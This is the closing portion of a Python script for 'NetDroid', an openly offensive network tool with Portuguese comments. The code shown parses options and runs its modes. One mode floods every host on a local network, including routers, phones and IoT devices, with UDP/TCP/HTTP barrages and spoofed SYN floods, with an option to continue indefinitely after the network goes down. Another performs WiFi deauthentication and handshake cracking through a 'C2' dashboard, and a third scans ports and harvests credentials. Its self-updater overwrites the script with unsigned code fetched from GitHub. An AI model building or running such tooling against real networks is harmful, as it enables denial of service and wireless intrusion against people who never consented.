        ua = {"User-Agent": f"NetDroid/{VERSION}"}
        ultimo_erro = ""
        for n in range(1, tentativas + 1):
            try:
                resp = requests.get(url, timeout=timeout, headers=ua)
                if resp.status_code == 200:
                    return resp.text
                ultimo_erro = f"HTTP {resp.status_code}"
                # 404 não vai virar 200 com retry — sai cedo
                if resp.status_code == 404:
                    break
            except Exception as e:
                ultimo_erro = str(e)
            if n < tentativas:
                if not silencioso:
                    self.ui.warn(f"  Tentativa {n}/{tentativas} falhou ({ultimo_erro}). Retentando...")
                time.sleep(1.5 * n)
        if not silencioso:
            self.ui.error(f"Falha após {tentativas} tentativas: {ultimo_erro}")
        return None

    def _fetch_branch_fallback(self, path: str, timeout: int = 20) -> Tuple[Optional[str], Optional[str]]:
        """Tenta cada branch em GITHUB_BRANCHES até achar arquivo. Retorna
        (conteudo, branch_que_funcionou). Útil porque o repo pode estar em
        master OU main dependendo de quando foi criado."""
        for branch in GITHUB_BRANCHES:
            url = GITHUB_RAW_TEMPLATE.format(repo=GITHUB_REPO, branch=branch, path=path)
            self.ui.info(f"  → tentando branch '{branch}'…")
            conteudo = self._fetch(url, timeout=timeout, tentativas=2, silencioso=True)
            if conteudo:
                self.ui.success(f"  ✓ branch '{branch}' OK ({len(conteudo)} bytes)")
                return conteudo, branch
        return None, None

    def run(self):
        self.ui.section("AUTO-UPDATE")
        if not HAS_REQUESTS:
            self.ui.error("requests não instalado. pip install requests")
            return
        try:
            self.ui.info(f"Verificando versão remota em github.com/{GITHUB_REPO}…")
            # Tenta VERSION com fallback master→main (não-fatal)
            version_text, branch_ver = self._fetch_branch_fallback("VERSION", timeout=10)
            if version_text is None:
                self.ui.warn("  Sem arquivo VERSION remoto — segue mesmo assim.")
                remote_version = "?"
            else:
                remote_version = version_text.strip().splitlines()[0] if version_text.strip() else "?"
            self.ui.info(f"  Local: {VERSION} | Remota: {remote_version}")
            if remote_version != "?" and remote_version == VERSION:
                self.ui.success("Já está na versão mais recente.")
                return
            if not self.ui.consent(f"Atualizar {VERSION} → {remote_version}?"):
                return

            self.ui.info("Baixando nova versão…")
            novo_codigo, branch_usada = self._fetch_branch_fallback("NetDroid.py", timeout=30)
            if novo_codigo is None:
                self.ui.error("Download abortado — repo inacessível em master e main.")
                return
            self.ui.info(f"  Origem: branch '{branch_usada}'")

            # Validações de segurança antes de sobrescrever
            tamanho = len(novo_codigo.encode("utf-8", errors="ignore"))
            if tamanho < 10_000:
                self.ui.error(f"Arquivo remoto muito pequeno ({tamanho} bytes). Abortando.")
                return
            if "NetDroid" not in novo_codigo or "def main_async" not in novo_codigo:
                self.ui.error("Conteúdo remoto não parece ser o NetDroid. Abortando.")
                return

            script_path = Path(__file__).resolve()
            backup = script_path.with_suffix(".py.bak")
            shutil.copy2(script_path, backup)
            self.ui.success(f"Backup salvo em: {backup}")
            script_path.write_text(novo_codigo, encoding="utf-8")
            self.ui.success(f"Atualizado para v{remote_version} ({tamanho:,} bytes).")
            self.ui.info("Rode novamente para usar a nova versão.")
        except Exception as e:
            self.ui.error(f"Erro no update: {e}")


# ═══════════════════ MAIN ENTRY ═══════════════════════════════

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="NetDroid",
        description="NetDroid — Análise profissional de redes WiFi (Termux/Linux/Windows)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            CLI minimalista — três modos de operação:

              python NetDroid.py --auto --god                       (reconhecimento total)
              python NetDroid.py --auto --godfall                   (ataque colossal à rede)
              python NetDroid.py --auto --godfall --infinite        (ataque sem freios até Ctrl+C)
              python NetDroid.py --root --kamikase                  (deauth WiFi — exige Kali)

              python NetDroid.py --root --auto --god                (boost apex militar)
              python NetDroid.py --t 192.168.1.5 --god              (alvo manual)
              python NetDroid.py --upgrade                          (auto-update)
        """))

    # Alvo
    p.add_argument("--auto", action="store_true",
                   help="Auto-detecta gateway/subnet/SSID")
    p.add_argument("--t", metavar="TARGET",
                   help="Alvo manual: IP único ou subnet CIDR (ex.: 192.168.1.5 ou 192.168.0.0/24)")

    # ─── 3 MODOS DE OPERAÇÃO ──────────────────────────────────
    p.add_argument("--god", action="store_true",
                   help="MODO RECONHECIMENTO: descoberta total de hosts (ARP + ping + TCP probe + "
                        "mDNS + NetBIOS + SSDP + SMB + HTTP + DHCP + nmap) + scan completo "
                        "1-65535 portas com avaliação de vulnerabilidades + auditoria defensiva "
                        "(SNMP/NTP/DNS amplificação, fingerprints 50+, paths default, ONVIF) + "
                        "risk scoring + relatório HTML/TXT didático.")

    p.add_argument("--godfall", action="store_true",
                   help="MODO ATAQUE: stress colossal a TODOS os hosts da rede (roteador, celular, "
                        "TV, IoT, etc.). 2 fases progressivas (OVERDRIVE→TITANFALL) com barragem "
                        "UDP/TCP multi-thread + HTTP storm + baseline iperf3. Sob --root: "
                        "SYN flood spoofed via scapy adicional.")
    p.add_argument("--infinite", action="store_true",
                   help="Combinado com --godfall: TITANFALL roda eternamente até Ctrl+C, sem "
                        "freios automáticos. Mostra '🚨 REDE CAIU' quando degrada mas continua.")

    p.add_argument("--kamikase", action="store_true",
                   help="MODO DEAUTH WIFI + DASHBOARD: ativa o painel C2 em "
                        "http://127.0.0.1:5556 automaticamente (--live implícito) "
                        "com 3 zonas drag-drop. EXIGE --root. Funciona pleno em "
                        "Kali Linux. USO LEGAL APENAS.")

    p.add_argument("--live", action="store_true",
                   help="DASHBOARD C2 EM TEMPO REAL: abre um painel web local elegante "
                        "(http://127.0.0.1:5556) com WebSocket, animações e atualização ao vivo. "
                        "Combinado com --god: mapeia hosts, vulnerabilidades, gráficos. "
                        "Combinado com --kamikase: 3 zonas (verde=APs vivos / vermelha=deauth / "
                        "azul=crack hashcat) com drag-and-drop entre elas. Foco Kali Linux.")

    # ─── BOOSTER ──────────────────────────────────────────────
    p.add_argument("--root", action="store_true",
                   help="Booster APEX: auto-detecta SO (Windows Admin / Linux root / Termux su) "
                        "e amplifica os 3 modos com raw sockets, scapy, binários nativos "
                        "(aireplay-ng, mdk4, tcpdump) e telemetria de kernel.")

    # Utilidades
    p.add_argument("--upgrade", action="store_true",
                   help="Auto-update via github.com/yamotoz/NetDroid (com retry e validação)")
    p.add_argument("--version", action="store_true",
                   help="Mostra a versão atual")

    return p


async def main_async(args):
    ui = TerminalUI()
    ui.boot_sequence()

    # ── version ───────────────────────────────
    if args.version:
        ui.info(f"NetDroid v{VERSION}")
        return

    # ── upgrade ───────────────────────────────
    if args.upgrade:
        Upgrader(ui).run()
        return

    # ── kamikase requer --root ────────────────
    if args.kamikase and not args.root:
        ui.error("--kamikase requer --root. Não há ataque 802.11 sem privilégio.")
        ui.info("Exemplo: sudo python NetDroid.py --root --kamikase")
        return

    # ── --kamikase implica --live (decisão v1.5.4) ─────────
    # O dashboard é inseparável da experiência do kamikase: zonas drag-drop,
    # botões NMCLI/Scapy/Cadeado, recapturar handshake, etc. Ativar live
    # automaticamente para o usuário não precisar lembrar do flag.
    if args.kamikase and not args.live:
        args.live = True
        ui.info("ℹ --live ativado automaticamente com --kamikase")

    has_action = any([args.god, args.godfall, args.kamikase])
    if not has_action:
        ui.error("Nenhuma ação especificada.")
        ui.info("Use UM (ou mais) destes 3 modos:")
        ui.info("  --god       → reconhecimento + scan total + auditoria defensiva")
        ui.info("  --godfall   → ataque colossal a todos os hosts da rede")
        ui.info("  --kamikase  → deauth WiFi 802.11 (exige --root)")
        return

    # ── --live só faz sentido com --god ou --kamikase ────
    if args.live and not (args.god or args.kamikase):
        ui.error("--live só funciona com --god ou --kamikase.")
        ui.info("Exemplo: python NetDroid.py --auto --god --live")
        return

    # ── inicia dashboard C2 se --live presente ────────────
    dashboard: Optional[LiveDashboard] = None
    if args.live:
        modo_dashboard = "kamikase" if args.kamikase else "god"
        dashboard = LiveDashboard(ui, modo_dashboard)
        if not dashboard.iniciar():
            return  # Flask/SocketIO ausentes

    # ── ativar privilege mode (--root) ────────
    global ctx_priv
    if args.root:
        ctx_priv = ContextoPrivilegio.detectar_e_validar(ui)
        if ctx_priv is None:
            return

    # ── kamikase NÃO precisa de target (opera no chip WiFi local)
    if not args.kamikase:
        if not args.auto and not args.t:
            ui.error("Use --auto ou --t <target> para definir o alvo.")
            ui.info("Exemplo: python NetDroid.py --auto --god")
            return

    # ── network detection ─────────────────────
    detector = NetworkDetector(ui, target=args.t)
    if not detector.detect():
        if args.kamikase:
            ui.warn("Detecção de rede falhou — seguindo só com kamikase.")
            detector.ssid = "kamikase"
            detector.output_dir = Path(f"kamikase_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            try:
                detector.output_dir.mkdir(parents=True, exist_ok=True)
            except Exception:
                detector.output_dir = Path(".")
        else:
            return

    hosts: List[Dict[str, Any]] = []
    stress_results: Dict = {}
    god_data: Dict = {}

    # Modelo de host completo (usado em fallbacks e --t manual)
    def _host_vazio(ip: str) -> Dict[str, Any]:
        return {"ip": ip, "mac": "N/A", "vendor": "N/A", "os": "N/A",
                "latency_ms": 0, "is_gateway": False, "ports": [], "services": {},
                "hostname": "", "device_type": "desconhecido",
                "fontes": [], "confiancas": {}, "vulns": [], "extra": {}}

    # ─────────────────────────────────────────────────────
    # MODO --god: descoberta total + scan completo + auditoria
    # ─────────────────────────────────────────────────────
    if args.god:
        # 1) HostDiscovery (absorvido do antigo --discover)
        ui.section("FASE 1/3 — DESCOBERTA TOTAL DE HOSTS")
        discovery = HostDiscovery(ui, detector)
        hosts = await discovery.discover()
        if not hosts:
            ui.warn("Nenhum host descoberto. Tentando alvo único do --t/gateway.")
            if args.t:
                try:
                    net = ipaddress.ip_network(args.t, strict=False)
                    if net.prefixlen == 32:
                        hosts = [_host_vazio(args.t)]
                    else:
                        hosts = [_host_vazio(str(h)) for h in list(net.hosts())[:254]]
                except ValueError:
                    hosts = [_host_vazio(args.t)]
            elif detector.gateway:
                hosts = [_host_vazio(detector.gateway)]
                hosts[0]["is_gateway"] = True

        # 2) PortScanner em modo INSANE (1-65535 + avaliação de vulns)
        if hosts:
            ui.section("FASE 2/3 — SCAN COMPLETO + AVALIAÇÃO DE VULNERABILIDADES")
            scanner = PortScanner(ui, mode="insane", insane=True)
            hosts = await scanner.scan_all(hosts)

        # 3) GodMode (auditoria defensiva profunda + ONVIF integrado)
        if hosts:
            ui.section("FASE 3/3 — AUDITORIA DEFENSIVA PROFUNDA")
            god = GodMode(ui, detector, hosts)
            await god.run()
            god_data = {
                "creds": god.found_creds,
                "risks": getattr(god, "risk_findings", []),
                "ssdp": god.ssdp_devices,
                "rtsp": god.rtsp_streams,
                "onvif": getattr(god, "onvif_devices", []),
            }

    # ─────────────────────────────────────────────────────
    # Hosts para --godfall (sem --god): subnet inteira como spray
    # ─────────────────────────────────────────────────────
    if not args.god and not hosts and args.t:
        try:
            net = ipaddress.ip_network(args.t, strict=False)
            if net.prefixlen == 32:
                hosts = [_host_vazio(args.t)]
            else:
                hosts = [_host_vazio(str(h)) for h in list(net.hosts())[:254]]
        except ValueError:
            hosts = [_host_vazio(args.t)]

    if not args.god and not hosts and detector.gateway and args.godfall:
        if detector.subnet:
            try:
                net = ipaddress.ip_network(detector.subnet, strict=False)
                todos = list(net.hosts())[:254]
                hosts = []
                for ip_obj in todos:
                    ip_str = str(ip_obj)
                    h = _host_vazio(ip_str)
                    h["ports"] = [80, 443, 8080]
                    if ip_str == detector.gateway:
                        h["is_gateway"] = True
                    hosts.append(h)
                ui.info(f"Modo --godfall sem --god: subnet inteira "
                        f"{detector.subnet} ({len(hosts)} alvos).")
            except Exception:
                hosts = [_host_vazio(detector.gateway)]
                hosts[0]["is_gateway"] = True
                hosts[0]["ports"] = [80, 443, 8080]

    # ─────────────────────────────────────────────────────
    # MODO --godfall: ataque colossal
    # ─────────────────────────────────────────────────────
    if args.godfall:
        stress = StressEngine(ui, detector, insane=True,
                              infinito=args.infinite)
        await stress.run_godfall(hosts)
        stress_results = stress.results

    # ─────────────────────────────────────────────────────
    # MODO --kamikase: deauth WiFi (live = 3 zonas dashboard)
    # ─────────────────────────────────────────────────────
    kamikase_results: Dict[str, Any] = {}
    if args.kamikase:
        kami = KamikaseEngine(ui, ctx_priv, detector, live=args.live)
        if dashboard is not None:
            dashboard.kami_engine = kami
        await kami.run()
        kamikase_results = kami.resultado()

    # ── report ───────────────────────────────────────────
    report = ReportEngine(ui, detector, hosts, stress_results, god_data,
                          kamikase_data=kamikase_results,
                          ctx_priv=ctx_priv)
    report.generate()

    # ── PDF executivo (se reportlab disponível) ──────────
    if HAS_REPORTLAB and (args.god or args.kamikase):
        PDFReport(ui).gerar(detector.output_dir or Path("."),
                             hosts, stress_results, god_data,
                             kamikase_results, ctx_priv)

    # ── --live: aguarda Ctrl+C para encerrar dashboard ───
    if dashboard is not None and not args.kamikase:
        ui.info("Dashboard C2 ativo. Pressione Ctrl+C para encerrar.")
        try:
            while True:
                await asyncio.sleep(1)
        except (KeyboardInterrupt, asyncio.CancelledError):
            ui.warn("Dashboard encerrado pelo usuário.")

    ui.section("COMPLETE")
    ui.success(f"Execução finalizada em {ui.elapsed()}")
    ui.info(f"Resultados em: {detector.output_dir}/")


def main():
    parser = build_parser()
    args = parser.parse_args()

    # Handle --version without requiring other args
    if args.version:
        try:
            if HAS_RICH:
                Console(force_terminal=True).print(BANNER.format(version=VERSION))
        except Exception:
            pass
        print(f"  NetDroid v{VERSION}")
        return

    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("\n  [!] Interrompido pelo usuário.")
    except Exception as e:
        print(f"\n  [ERROR] {e}")
        traceback.print_exc()


if __name__ == "__main__":
    main()

